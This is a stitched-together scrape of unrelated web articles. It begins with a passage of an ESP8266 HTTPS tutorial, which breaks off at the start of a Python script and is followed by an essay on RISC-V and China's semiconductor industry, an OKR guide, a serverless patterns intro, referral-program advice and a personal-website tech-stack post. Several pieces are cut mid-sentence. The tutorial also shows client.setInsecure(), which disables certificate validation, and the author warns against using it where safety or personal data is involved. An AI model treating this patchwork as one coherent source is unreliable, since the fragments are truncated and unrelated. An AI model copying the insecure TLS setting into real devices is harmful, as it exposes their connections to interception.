stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a> is to extract the fingerprint of a site's certificate and store this in the code. The fingerprint is a hash of the certificate. Because it is very unlikely that a second certificate exists with the same hash, we know the website can be trusted if the hash is the same as the one we store.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
const char<span>*</span> fingerpr <span>=</span> <span>"CF 05 98 89 CA FF 8E D8 5E 5C E0 C2 E4 F7 E6 C3 C7 50 DD 5C"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>

<span>if</span> <span>(</span>client<span>.</span><span>verify</span><span>(</span>fingerpr<span>,</span> host<span>)</span><span>)</span> 
<span>{</span>  
    http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

    <span>String</span> payload<span>;</span>
    <span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
        payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
<span>}</span>
<span>else</span> 
<span>{</span>
  <span>Serial</span><span>.</span><span>println</span><span>(</span><span>"certificate doesn't match"</span><span>)</span><span>;</span>
<span>}</span></code></pre><p>This approach is simple because the certificate chain does not need to be validated, but has two main issues for me:</p><ol><li>The fingerprint needs to be extracted and stored manually for each page the ESP8266 needs to connect to.</li><li>An even bigger issue is that these fingerprints change roughly once a year when the certificate expires. This means that your program can break at any time and you manually need to update the fingerprint in your code.</li></ol><h3>client.setInsecure() - easy but unsafe</h3><p>You could argue that secure connections are overkill for your application. I would be the first to admit that I prefer a pragmatic solution where possible. Imagine that all you want to do with your ESP8266 is to fetch the weather from the internet and display it in some form. Personally I would not mind to do this in an insecure way, since there are no real dangers.</p><p>But imagine the ESP8266 is controlling the lock on your door or a 3D printer which can heat up and catch on fire. Or think of the case where you are transfering personal information to or from some site or API. In these cases it is better to be safe than sorry, and the method in this section should not be used. Nevertheless, I will show it here:</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>
            
WiFiClientSecure client<span>;</span>
client<span>.</span><span>setInsecure</span><span>(</span><span>)</span><span>;</span> <span>//the magic line, use with caution</span>
client<span>.</span><span>connect</span><span>(</span>host<span>,</span> httpsPort<span>)</span><span>;</span>
  
http<span>.</span><span>begin</span><span>(</span>client<span>,</span> host<span>)</span><span>;</span>

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>http<span>.</span><span>GET</span><span>(</span><span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    
</code></pre><p>So basically all you need to do is to add <span>client.setInsecure()</span> to your code and it will start the connection without validating the certificate. </p><h3>HTTPS requests with the IoT framework</h3><p>With that out of the way, we finally get to the implementation I have chosen instead for my ESP8266 IoT Framework, which is placed in the <span>fetch</span> class.</p><pre><code>const char<span>*</span> host <span>=</span> <span>"https://api.github.com"</span><span>;</span>            

<span>String</span> payload<span>;</span>
<span>if</span> <span>(</span>fetch<span>.</span><span>GET</span><span>(</span>host<span>)</span> <span>==</span> HTTP_CODE_OK<span>)</span>    
    payload <span>=</span> http<span>.</span><span>getString</span><span>(</span><span>)</span><span>;</span>    

fetch<span>.</span><span>clean</span><span>(</span><span>)</span><span>;</span>
</code></pre><p>Looks easy enough doesn't it ? So what happens behind the scenes? </p><p>Basically the same thing as in a typical Browser. The ESP8266 contains a full store of all the trusted root certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> memory. This takes roughly ~170 kB of flash memory at the moment, which in my case can easily be missed. This certificate store is generated automatically on building the sofware, no manual steps required. This also means that you can do secure HTTPS requests to any URL (so you could even configure or change a URL after the build).</p><p>You might think, but hey! These certificates will expire too. And this is true. The only difference with the fingerprints is that the validity of root certificates is much longer, and can be over 20 years. Whereas the fingerprint for some services can change every few months.</p><p>As a starting point I found a great but hidden example in the ESP8266 Arduino <a href="https://github.com/esp8266/Arduino/tree/master/libraries/ESP8266WiFi/examples/BearSSL_CertStore" target="_blank" rel="noopener noreferrer">repo<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>. This example contains a Python script that gets all the certificates from the Mozilla root certificate store and stores them as files. These files will then be uploaded to the <abbr title="SPIFFS is an abbreviation for 'Serial Peripheral Interface Flash File System', which is a way to store files on embedded systems.">SPIFFS</abbr> and used during HTTPS requests. I adapted this example to be able to store the certificates in <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> instead.</p><h3>Generating a certificate store</h3><p>When a request is started, the <span>certStore</span> class will compare the hash of the certificate issuer with all the hashes of the stored root certificates. If there is a match, the correctness of the domain and other properties will be checked and the connection will be initialized.</p><p>In the default Arduino example these hashes for the stored certificates are generated in the <span>certStore</span> class. It seems more logical to me to do this directly in the Python script to save computing time on the ESP8266, so thats where I moved it. Furthermore I adapted the <span>certStore</span> class (<a href="https://github.com/maakbaas/esp8266-iot-framework/blob/master/src/certStore.cpp" target="_blank" rel="noopener noreferrer">GitHub<!-- --> <span><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></span></a>) to read the information from my <abbr title="PROGMEM is part of the flash memory where read-only variables can be stored to reduce RAM usage.">PROGMEM</abbr> variables rather than the file system. </p><p>The final Python script to generate the certificate store is shown below.</p><pre><code><span>from</span> __future__ <span>import</span> print_function

            <section>
                <div>
                    <p>【想看中文的<a href="https://interconnected.blog/riscv-china-nightingales/#chinese-version-below">读者请点击这里</a>或滚动到本页下方】</p><p>Last weekend, I read <a href="https://www.huxiu.com/article/360061.html">a long, epic piece of techlore</a> that chronicled the fierce and bitter rivalry between TSMC and Samsung in their fight to become the world’s number 1 chip foundry, which stretched back three decades and continues today.</p><p>Among the many dramatic details was the “Nightingale program” that TSMC started in the mid-2010s to jumpstart its R&amp;D, because it was falling behind Samsung and losing Apple’s A9 chip orders to the Korean conglomerate. TSMC conceived of a three-shift, 24-hour non-stop R&amp;D operation, taking a page out of their fellow Taiwanese manufacturing behemoth Foxconn’s assembly operation. The “Nightingales” were engineers and researchers, who were willing to work the “graveyard shift” for a 30% increase in base salary and 50% increase in dividend payout. Due to this program, <strong>the total working hours clocked in Taiwan in 2014 was 2135</strong>, apparently the most of any economy in the world that year.</p><p>TSMC, and arguably Taiwan’s entire economy, was confronting an existential struggle at that time. SMIC (the largest chip foundry in China), and arguably China’s technological and economic future, is confronting a similarly existential struggle on a larger scale.</p><p>There are many interconnected elements that, when put together, could determine how China will come out on the other end of this struggle -- <strong>RISC-V, foundry technology, the “New Infrastructure” stimulus program, open source, and a few key TSMC personnels</strong>, who are now at the helm of China’s semiconductor industry.</p><p>Let’s take a look at each of them, sequentially and interconnectedly.</p><h2 id="risc-v-strengths-and-weaknesses">RISC-V: Strengths and Weaknesses</h2><p>The conversation around China’s journey towards technological self-reliance often involves <strong>RISC-V</strong> -- an open standard Instruction Set Architecture (ISA) for hardware that’s under open source licenses, thus any one can run, change, copy, and distribute it, in accordance with<a href="https://www.gnu.org/philosophy/free-sw.en.html"> the four freedoms</a> of open source.</p><figure><img src="https://lh6.googleusercontent.com/sVMZ8L3CA61u_kc0hdRdB9AItYEuK65vUJ70os7CAaFpogycLyqhYL_BbwMndKktijiEAF8Bi9WLyKCmW5ztmGE3Zhw2dQrRP0VwWcxWIsUqTFVFfYXIS4K5wp_SDExCRiug0cE1" alt=""><figcaption>RISC-V Ecosystem, courtesy of SiFive.</figcaption></figure><p>However, RISC-V is still young. Its<a href="https://riscv.org/specifications/"> user-space ISA</a> and<a href="https://riscv.org/specifications/privileged-isa/"> privileged ISA</a> wasn’t frozen, and thus ready for large-scale software and hardware development, until June 2019. The technology and community ecosystem is maturing, and support from large Chinese organizations has a lot to do with it. Of <a href="https://riscv.org/members-at-a-glance/">the six Premier Members</a> of the official RISC-V foundation, RISC-V International, &nbsp;four are Chinese organizations -- Alibaba, Huawei, RIOS Lab, and the Institute of Computing Technology of the Chinese Academy of Sciences.</p><p>But in the near future (say the next five years), what can RISC-V, the technology, realistically enable China to accomplish?</p><p><strong>What is it good for?</strong> &nbsp;RISC-V is a very good foundation for rapidly prototyping and building <strong>special purpose</strong> chips. The development cycle and experience feels closer to software than hardware. This speed in development is partly because it’s open-sourced -- no hassle in getting a commercial license, as oppose to its proprietary counterparts like ARM -- and also partly because the ISA itself is simplified and “reduced” (i.e. the R in RISC), as opposed to CISC (the C means “complex”) which underpins more powerful, proprietary ISAs like Intel’s x86. This reduced architecture enables and optimizes simple computation instructions well, literally elementary school math: addition, subtraction, multiplication, division, etc. It’s less capable of supporting complex mathematical operations, like matrix multiplication and partial derivative (used widely in Deep Learning AI).</p><p>Thus, in reality, chips designed using RISC-V have been used most commonly in <strong>IoT and embedded systems</strong> scenarios. Because of its simplicity and malleability, RISC-V chips also <strong>tend to have low power consumption</strong>, which is a good attribute when battery life is an issue, e.g. wearable devices. This reduced simplicity also means that the compiler (the software layer that translates code, like C, into machine instructions for a chip to execute) does not need to be purposefully designed to optimize performance on RISC-V. Using some common compilers <a href="https://riscv.org/software-status/#c-compilers-and-libraries">like GCC, which RISC-V </a>supports, will do.</p><p><strong>What does it lack? </strong>As you might’ve guessed, RISC-V’s reduced simplicity is also the source of its limitations. While many people like to pit RISC-V against a general purpose ISAs, like Intel’s, <strong>they are more compliments than competitors. </strong>In fact, special purpose RISC-V chips that accelerate certain computations for AI workloads do run side-by-side along general purpose Intel chips in the cloud. It’ll be a long time (more than five years, in my opinion) before RISC-V can enable the design of a <strong>general purpose</strong> chip that powers our iPhones, laptops, or cloud computing servers in a data center, with enough developers incentivized to both extend the ISA and the compiler and other infrastructure software on top of it.</p><p><strong>Can RISC-V become general purpose some day?</strong> Of course. <strong>But that’s not an inevitability</strong>. It’s <strong>a strategic choice</strong> that the RISC-V community can make and work towards, with all the complexity in upstream coordination, developer community building, and open governance, not to mention the work of building the technology itself, that must be executed collectively. That possible future is perhaps the most interesting question when we think about China’s self-reliance, which I’ll discuss in more detail below <strong>in the context of fostering open source</strong>.</p><h2 id="-new-infrastructure-">“New Infrastructure”</h2><p>With the strengths and weaknesses of RISC-V in mind, let’s see where RISC-V chips could get deployed in China’s economy and infrastructure in the foreseeable future.</p><p>It’s no secret that central government industrial policy matters a lot in China, even though its market-driven economy is what materializes much of that vision. The most relevant piece of policy is <a href="http://www.china.org.cn/business/2020-04/22/content_75961988.htm">the “New Infrastructure” spending plan </a>that came out of the National Development and Reform Commission, as a response to the COVID-19 pandemic to boost the economy. This infrastructure stimulus plan sits in a larger context of two other long-term strategic plans: Made in China 2025 and China Standards 2035.</p><p>The details of this “New Infrastructure” plan have emerged in the last couple months, with major emphasis in IT and digital infrastructure, not just traditional infrastructure like highways and railroads. As it often happens in China, the signals sent from the top have already shifted private investment dollars. Nascent chip startups, all of a sudden, are <a href="https://uk.reuters.com/article/uk-china-semiconductors-analysis/sino-u-s-tech-race-turbo-charges-china-chip-investment-triggering-bubble-fear-idUKKBN23V3CO">enjoying investor attention and bubbly valuations</a>.</p><p>With that said, here are some of the “New Infrastructure” sectors that I think RISC-V could play an immediate role in, given its strengths:</p><ul><li>IoT</li><li>Smart transportation</li><li>New energy vehicle chargers</li><li>Limited AI (specific workloads that need customized acceleration)</li><li>Autonomous vehicles (limited to certain types of sensors and data collection)</li></ul><p>And as for sectors that I don’t see RISC-V making much of a dent, given its current limitations:</p><ul><li>Cloud computing</li><li>5G (both base station construction and consumer devices)</li><li>Blockchain</li><li>Data centers</li><li>Big data</li><li>Large-scale AI training and production deployment</li></ul><p>As you can see, RISC-V impact would be limited,<strong> but not insignificant</strong>. The logical next step would be for China to help evolve RISC-V <strong>into a more general purpose ISA</strong>, and reduce its reliance on proprietary solutions from ARM or Intel that could always be subjected to more sanctions.</p><p>The path to that end would have to be fostering open source <strong>and doing it the right way.</strong></p><h2 id="fostering-open-source-the-right-way">Fostering Open Source, the Right Way</h2><p>Open source has been popping up in <a href="https://mp.weixin.qq.com/s/Qcze4R-7zL2wjMh_DNVCIQ">a lot of discussions</a> in various Chinese technical and R&amp;D communities, triggered in particular by MATLAB being now off-limit to Chinese universities that are on the U.S. export control entity list. The discussion inevitably leads to open source: are there open source alternatives to MATLAB? What about CAD softwares, like EDA tools, which every chip foundry needs? Will there be an open source EDA option?</p><p>Implicit in these discussions is a predominant “takers” mentality towards open source. In China, open source solutions are mostly seen as “free stuff” that you can take and use, without any expectation or incentive to give back (or in open source parlance: “contribute upstream”).</p><p>It’s already happening in RISC-V. Alibaba <a href="https://www.techspot.com/news/81177-china-alibaba-making-16-core-25-ghz-risc.html">sports the fastest RISC-V based processor to date</a>, but there’s no intention to my knowledge for the design to also be open-sourced or at least publicly shared for the benefit of the ecosystem. Many small startups in China, now showered with new investments, are doing the same -- using RISC-V to make special purpose chips that are effectively proprietary.</p><p><em>(This is not to generalize that all Chinese organizations are bad open source players; some are contributing a lot and have open source in their DNA. I’ve profiled many of the big tech firms and some startups from the lens in Part II of my “</em><a href="https://interconnected.blog/open-source-in-china-the-game/"><em>Open Source in China</em></a><em>” series.)</em></p><p><strong>If</strong> China hopes to evolve RISC-V into a more powerful, general-purpose building block to achieve semiconductor self-reliance, Chinese organizations, both individually and collectively, would have to shift from a zero-sum “takers” mentality to a positive-sum “stakeholders” mentality. What that means in reality is absorbing and practicing the open source way of doing things -- not just contributing code upstream and being more willing to share, but also behaviors like transparent governance, open discussions with other stakeholders and developers, and clear due process for decision-making, big and small. <strong>These are both technical and human complexities.</strong></p><p>With an existential struggle at hand, there’s reason to believe that Chinese companies may behave differently for the sake of achieving a national imperative and be less concerned about the tit-for-tat, zero-sum nature of market competition, which is quite cutthroat in China. And<strong> if done right</strong>, RISC-V could unleash massive technological innovation broadly and help China deal with its existential struggle specifically.</p><h2 id="foundries-smic-hsmc">Foundries: SMIC, HSMC</h2><p>Let’…</p></div></section></article></div></div></div>

<p>In this article, we’ll tell you what the OKR concept implies and how to start adhering to it.</p>


<div>
  <p>
    When we grew from 10 to 30 people, we got to thinking we became defocused and asynchronous. One part of the team didn’t know what another one was doing; we were playing the Chinese whispers feeling we were heading separate ways. That’s exactly when we decided to adhere to OKR and we still do so.   </p>

  
</div>




<p>Many companies face the same problem, and the OKR framework helps tackle the issue, namely sync people up and help them move in the same direction while meeting their objectives. We’ve got some experience to tell you how you can implement OKR and why no one can do this right the first time (which is completely normal).</p>



<p>To make this article more insightful, we’ve talked to Ilya, a product &amp; strategy thinking mentor, and discovered his experience in implementing OKR in different companies.</p>



<p>Grab your pen and some paper and make notes on the OKR implementation as you read this article.&nbsp;</p>




<h2 id="what-is-the-okr">What is the OKR?</h2>



<p><strong>OKR (objectives and key results)</strong> is a goal-setting framework helping you determine the direction of your company’s growth, sync teams up, and engage all employees in the process of setting objectives and defining key results.&nbsp;</p>



<p>The objectives are set at these levels:</p>



<ul><li>company,</li><li>teams,</li><li>particular employees.</li></ul>



<p>Objectives are then decomposed into measurable results the company wants to achieve. The objective is marked as achieved if a certain result is met.</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/mission-.jpg" alt="mission strategy key results tasks" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/mission-.jpg"></figure>



<p>OKRs first appeared in Intel and then moved to Google. Now many high profile companies like Spotify, Twitter, Airbnb, and Miro use them. It doesn’t mean OKRs can only be applied in the IT universe. You can use them anywhere! Even when planning your own life. I mean it.&nbsp;</p>



<p>For example, my objective for the next 2 years is to learn French. My key results are to pass DALF for C1 and have 10 Tinder matches with native speakers.&nbsp;</p>



<p>The major thing about OKR is that both top management and the whole company are involved in defining objectives and key results. That’s why OKRs help you sync up with your team, move in the same direction, and increase the involvement of each team member as everyone knows how they can influence the achievement of a common objective.&nbsp;</p>




<h2 id="what-makes-okrs-so-great">What makes OKRs so great?</h2>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okrs-great.jpg" alt="what makes OKR great" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okrs-great.jpg"></figure>



<p><strong>Transparency:</strong> to make sure OKRs work for good, the company should be 100% transparent for its employees. That’s the only way you can encourage the team to perform great. Every employee should have access to OKRs.</p>



<p><strong>Simplicity:</strong> OKRs are easy to use and understand. Any person opening the OKR spreadsheet can easily get what it’s saying.</p>



<p><strong>Flexibility:</strong> OKRs can be set for any term from a month to several years. This helps you set the pace of the company’s development and adjust to the environment quickly.</p>



<p><strong>Two-way goal-setting:</strong> OKRs are not set for teams by the top management. They can draw up the OKRs, but then they should pass them on to teams so that they can edit and adjust the OKRs. And there can be several iterations.</p>



<p><strong>Inspiring goals:</strong><strong> </strong>within the OKR concept, objectives should be ambitious and catchy. Inspiring objectives encourage the team to achieve better results. However, the OKR assumes that you can’t achieve 100% of your objectives and that’s completely okay.</p>



<p><strong>An OKR isn’t a KPI:</strong> The OKR concept doesn’t have an incentive system for achieving objectives. Non-monetary motivation establishes a welcoming environment. So, employees are willing to generate ambitious ideas and have no fear of not meeting the targets.&nbsp;</p>


<div>
  <p>
    An OKR isn’t a KPI. There’s no cash bonus for meeting the OKR. The concept is different, and that’s cool. An OKR isn’t something that should be 100% achieved. If we achieve 100% of our OKRs, it means our objectives were not ambitious enough. And vice versa, if we only achieved 30% of our OKRs, it means we’ve set the bar too high. Meeting around 70% of OKRs says we’re doing a great job.  </p>

  
</div>





<h2 id="objectives-key-results-and-initiatives">Objectives, key results, and initiatives</h2>



<p>How do we define Objectives and Key Results (KR)? John Doerr’s formula helps you get the difference between these two.<a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/John_Doerr" target="_blank" rel="noreferrer noopener"> John Doerr</a> is the person who invented OKR and shared his knowledge with Google. Here’s his formula:</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/objective-and-goal-1.jpg" alt="i will be as measured by" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/objective-and-goal-1.jpg"></figure>



<p>Within the concept, the objective setting is based on its definition and our perception of an achieved objective. The objective should describe the target, and the key results are the parameters we will use to know if we have met the objective. Let’s look closer at the formula:&nbsp;</p>



<figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/i-will-be-2.jpg" alt="i will be happy in case" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/i-will-be-2.jpg"></figure>



<p>Key results are an equally important part of the formula. They are decisive in whether an objective has been met or not.</p>



<p>Another way to understand KRs is to ask the question: “If our goal is X, what will success look like?”</p>


<div>
  <p>
    The OKR has an objective that may sound obscure in terms of the result, but it’s powerful and appealing. The second part is the key result, most often it’s a specific metric. The key result shows whether the objective has been met or not. If the goal is inspiring, then the KR reflects reality.  </p>

  
</div>




<h3><strong>What should be the objectives?</strong></h3>



<p><strong>Objectives </strong>are catchy qualitative descriptions of what we want to achieve. Objectives should be concise, ambitious, inspiring, and engaging. They must encourage and challenge the team. In this case, the whole company will have a better chance of achieving greater success.</p>



<h3><strong>What are the “key results”?</strong></h3>



<p><strong>Key results </strong>are a set of parameters that we use to assess how close we have gotten to our objective. Each objective usually involves between 3 to 5 KRs. If you pick more, the teams will find it hard to stay focused. Key results must be quantitative and measurable.</p>



<p>There are 2 kinds of key results:</p>



<ul><li><strong>Key action-driven result.</strong> Success is measured in completed/not completed projects.</li><li><strong>Key value-driven result.</strong> Success is measured in the value that the company or customers obtain.</li></ul>



<p>Here are some results of key action-driven results:</p>



<ul><li>the chatbot launch</li><li>an online course launching</li><li>the OKR book release</li></ul>



<p>Below are some key value-driven results:</p>



<ul><li>increasing the MRR from X to Y;</li><li>decreasing the Churn rate from X to Y;</li><li>increasing the ER from X to Y;</li><li>maintaining the CAC at around X.</li></ul>



<p>Take a look at the table of key action-driven results and their value equivalents:</p>



<div><figure><img loading="lazy" src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okr-1.jpg" alt="key action-driven results and key value-driven results" data-old-src="https://www.dashly.io/blog/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://cdn-www.dashly.io/blog/wp-content/uploads/2020/07/okr-1.jpg"></figure></div>



<p>Key action-driven results are highly likely to fail in leading you to an objective. The release of a new feature is not a success guarantee. That’s why OKRs have to be value-driven. Only then can they be as effective as possible.&nbsp;</p>



<p>Key results should reflect the value to the company or its customers. Teams will be focused on achieving greater success and there’ll be more room for creativity. The employees won’t be stuck on a particular activity but will look for different ways to achieve the objective.&nbsp;</p>



<p>But if you’re implementing the concept for the first time, it makes more sense to choose actions as key results. They will help you to switch to OKR:</p>



<p>Many companies try to add metrics to KRs immediately and fail this stage. If there was no meaningful movement in the company at the beginning, you’ll find it hard to track the metrics.</p>


<div>
  <p>
    Many companies try to add metrics to KRs immediately and fail this stage. If there was no meaningful movement in the company at the beginning, you’ll find it hard to track the metrics. First, it’s a good idea to put a set of actions in KRs that we have to perform to get closer to the objective: release a huge feature or a marketing campaign. By the end of the OKR term, you’ll be able to evaluate the success based on the done/not done principle. Another very important point is to only include metrics that we know how to calculate in KRs.   </p>

  
</div>




<h3>How we did it at Dashly</h3>



<p>Last year, the goal for OKR in Dashly was to double the number of active users. It’s a catchy and quite ambitious goal, isn’t it?&nbsp;</p>



<p>How do we know if we’ve achieved it or not? We’ve chosen key metric-based results and we’ve put all our effort to reach them and evaluate our success using them.</p>



<p>If objectives are about ambitions, key results must be clear and precise.&nbsp;</p>



<p>The key results for the “doubling” target could be the following:</p>



<ul><li>Increasing the MRR to X: this is our monthly revenue. If we want to grow, we should grow our revenue, too.&nbsp;</li><li>Decreasing the Churn rate to Y. The fewer users leave us, the easier it is for us to grow.</li><li>The CAC must not exceed: this is the Customer Acquisition Cost. If we want to be efficient, we can’t spend more than a certain amount on user acquisition.</li><li>Increasing the number of organic visitors to X. The more website visitors we have, the more purchases we generate.&nbsp;</li></ul>



<h3>OKR initiatives</h3>



<p>Objectives and key results should be value-oriented. So, you must learn not to mix them up with activities and tasks that need to be done to achieve the OKR. Initiatives will help in this.</p>



<p><strong>Initiatives </strong>are the very activities, tasks, and projects that you need to accomplish to achieve the OKR.</p>



<p>Let’s get back to our goal of doubling up. We’ve chosen several key results we’ll use to evaluate our success in the future. The KRs are to increase the MRR to X and decrease the Churn rate to Y. And these are the initiatives:&nbsp;&nbsp;</p>



<ul><li>launching the chatbot: a huge and awesome feature will help decrease the customer churn;</li><li>online course release will help generate new target leads;</li><li>the OKR book release will help increase the number of product signups.</li></ul>

<p><strong>Serverless</strong> gives us the power to focus on delivering value to our customers without worrying about the maintenance and operations of the underlying compute resources. Cloud providers (like AWS), also give us a huge number of managed services that we can stitch together to create incredibly powerful, and massively scalable serverless microservices.</p>
<p>Almost 2 years ago now, I wrote a post on<strong> <a href="https://www.jeremydaly.com/serverless-microservice-patterns-for-aws/">Serverless Microservice Patterns for AWS</a>&nbsp;</strong>that became a popular reference for newbies and serverless veterans alike. The capabilities of serverless have changed dramatically since then, opening up a ton of new patterns and possibilities. This project is intended to capture, share, explore, and debate the patterns and practices being used in serverless production applications today.</p>
<p>I will be adding new patterns regularly, each with interactive architecture diagrams to help you better understand them, and sample templates for you to begin quickly implementing them in your serverless projects. <strong>This is a community effort, so <a href="https://github.com/jeremydaly/reference-architectures" target="_blank" rel="noopener">contributions</a> are welcome and greatly appreciated.</strong> Enjoy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        

                          <p><em><span>Integrating a referral program has been proven to be the most effective way to drive new traffic. Before looking for a reliable </span><a href="https://www.purrweb.com/"><span>MVP development company</span></a><span>, make sure you know how to create a working referral program for your future startup.&nbsp;</span></em><span><br>
</span></p>
<p>First, let’s figure out together what the term ‘Referral program’ actually means. Basically, it’s is a recruiting strategy, that enables users to get some kind of benefits in exchange for referrals.</p>
<p>Two reasons why referral programs are super effective:</p>
<ul>
<li>We trust people more than advertising.</li>
<li>When buying goods or services we usually rely on users’ experience.</li>
</ul>
<p>Referred users tend to be more loyal than people, who were attracted by advertising content. It generally takes them less time to try a new product and then make the first purchase.</p>
<p>Below we shared a couple of things to keep in mind when building a referral program for startup. Check them all to let your small business grow:</p>
<h2>Find a way to motivate users</h2>
<p>To create a truly working referral program for startup, think of what you may offer to make someone share your product with others.</p>
<p>Some product owners may think something like ‘Hey, my product is freaking awesome. Why should I stimulate users, who are already happy with it? Let us disappoint you — ‘being awesome’ is just a natural stare of things. If a product is NOT awesome (the entire concept, UI/UX), nothing will work. Don’t sit it out waiting for new customers to come — it is nothing but a waste of time and money.</p>
<p>To make users recommend you, take into account their social activity. Be it an app for pet owners or a free-trial music marketplace, users are just ordinary people who care primarily about their own problems. Will they spare even a few minutes of their precious time to send referral-invites?</p>

<h5>Being ‘just awesome’ isn’t truly awesome</h5>
<p>You might say ‘Ok. How much should I pay for every new user?’ In some cases, money reward doesn’t even work. Why? Because some users may think that the product price isn’t attractive enough to make them believe that recommending ‘this thing’ to friends is a good idea. In this case, it’s better to give them stuff like extra storage space or free premium subscription.</p>
<p>A few examples for you to check:</p>
<blockquote>
<p><em>When the majority of Dropbox users wanted to get extra storage space, the company launched a referral program with extra space for each new user invited. For every referral, both a user and a referral got 500MB of free storage space. With a free account, the user could invite up to 32 new users for a whopping total of 16 GB of bonus storage space. Pro account users earned 1 GB per referral, for a total of 32 GB of bonus storage space.</em></p>
<p><em>Trello gives a free month of Trello Gold (up to 12 months) for every person you get to join this app.&nbsp;</em></p></blockquote>
<h2>Figure out what a referral action will be</h2>
<p>How to create a working referral program for startup? Find out what a user should do to get benefits. A user must achieve the main goal — attract new customers to your startup. And this is what you should reward for — for the provided value, not actions.</p>
<blockquote><p><em>When people invite friends to Evernote, they earn points. Points can be used for monthly or annual subscriptions to Evernote Premium.</em></p></blockquote>
<h5>Reward not for sending invitations, but for new users</h5>
<h2>Is there anything else to keep in mind?</h2>
<p>Clearly explain the required referral actions in your marketing messages. Help users understand what exactly they should do and how they’ll be rewarded. Use plain language and provide all the needed details —&nbsp; a quick demo or an overview with referral program rules will be more than enough.</p>

July 2, 2020 | https://formcake.com/blog/top-concerns-when-choosing-a-tech-stack-for-your-personal-website | <a href="https://web.archive.org/web/*/https://formcake.com/blog/top-concerns-when-choosing-a-tech-stack-for-your-personal-website">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="frontend-stack">Frontend Stack</h2>
<p>Until somewhat recently, I think that hosting was probably a more important concern for creating a personal site than the frontend stack. But with options like <a href="https://pages.github.com/">Github Pages</a>, <a href="https://www.netlify.com/">Netlify</a>, and <a href="https://vercel.com/">Vercel</a>, the hosting part of the equation has become a whole lot easier. Nowadays a personal site is all about what you build it with. I think it's fair to say most people looking to build a personal site are, in equal parts, wanting to get a professional foothold on the web and also just have fun building something new. And when building something new, there is a whole lot of new out there. So much so, that many people cannot even bring themselves to begin because they're afraid of picking the wrong stack.</p>
<h3 id="picking-a-framework">Picking A Framework</h3>
<p>A good question to ask yourself when picking a framework is which of the two following focuses is most important to you.</p>
<h4 id="1-javascript">1) Javascript</h4>
<p>Javascript, the necessary evil turned eternal turf war, is probably at top of mind for most people looking to build a personal site in order to "play with new tech". This is also a great splitter of options if you do know what javascript framework you want to work in. If you still cannot decide on a framework, then you probably have more this vs that javascript framework articles to read.</p>
<h5 id="react">React</h5>
<p>If you must work with <a href="https://reactjs.org/">React</a>, <a href="https://www.gatsbyjs.org/">Gatsbyjs</a> and <a href="https://nextjs.org/">Nextjs</a> are very popular and capable options. Gatsbyjs takes a more holistic approach between the frontend and the backend whereas Nextjs is mostly concerned with creating a static and ssr environment for React apps.</p>
<h5 id="vuejs">VueJs</h5>
<p>If you must work with Vuejs (my personal favorite), <a href="https://nuxtjs.org/">Nuxtjs</a> (what <a href="https://formcake.com/">formcake.com</a> is build on), <a href="https://gridsome.org/">Gridsome</a>, and <a href="https://vuepress.vuejs.org/">VuePress</a> are all great options. As is often the case in the world of Vue, it is often easiest to compare Vue based project's with their React equivalents. Gridsome is like Gatsbyjs and Nuxtjs is like Nextjs. VuePress is much more targeted to those who want to create a site for blogging.</p>
<h5 id="angular">Angular</h5>
